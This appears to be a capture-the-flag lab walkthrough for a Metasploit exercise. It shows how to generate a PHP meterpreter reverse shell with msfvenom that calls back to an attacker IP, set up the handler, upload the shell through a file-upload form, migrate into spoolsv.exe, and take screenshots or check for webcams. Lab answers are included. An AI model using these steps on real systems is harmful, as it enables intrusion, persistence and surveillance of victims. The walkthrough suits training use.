# METASPLOIT

## BASIC INFO
```
export IP=10.10.223.171
```

## RECONNAISSANCE

There is a web server running n port 80.
It allows us to upload file...
Reverse php shell?

## GAINING ACCESS

Generate reverse php shell with msfvenom

```
msfvenom -p php/meterpreter/reverse_tcp lhost=10.8.8.177 lport=9001 -f raw > rev_shell.php

```

Fire up msfconsole to listen on the port for incoming traffic

```
msfconsole

use explot/multi/handler
set payload php/meterpreter/reverse_tcp
set lhost tun0
set lport 9001
run -j
```

Now go to the website and upload the file. Then navigate to the file location.

## PRIVILAGE ESCALATION

In metasploit terminal, type `sessions` to see all open sessions available.
`sessions 1` to interact with the session we just created.

> - **Challenge time! What date was the file fileUpload.php created? Enter your answer as YYYY-MM-DD (convert to GMT)**
>> 2018-12-13

Type `shell` to get a interactive shell on the Windows machine
`sysinfo` to have a look over the system info.

## MAINTAINING ACCESS

Currently the shell is only running on a PHP reverse shell. We need to migrate to another process for a more stable shell.
To migrate we need to upgrade the shell first.

```
ctrl^z
sessions -u 1
sessions 2
migrate -N spoolsv.exe
```
First we background current session. Then we upgrade the session from a PHP shell to a TCP shell. Then we interact with the new shell and migrate into spoolsv.exe (common process to migrate into).

## CHALLENGES

> - **Are there any webcams running on the machine? (other steps maybe required)**
>> No

To solve this challenge we first load in kiwi with `load kiwi`. Then we run the command `webcam_list` to show any webcam on the machine.

> - **Take a screenshot of the system (other steps maybe required)**
>> No answer required.

Since we loaded in kiwi, we can just use `screenshot` to get a screenshot of the Dekstop

> - **RDP into the machine**
>> No answer required

RDP is enabled on this machine. So we can just use
`rdesktop -u <username> -p <password> <ipaddress>` to log in.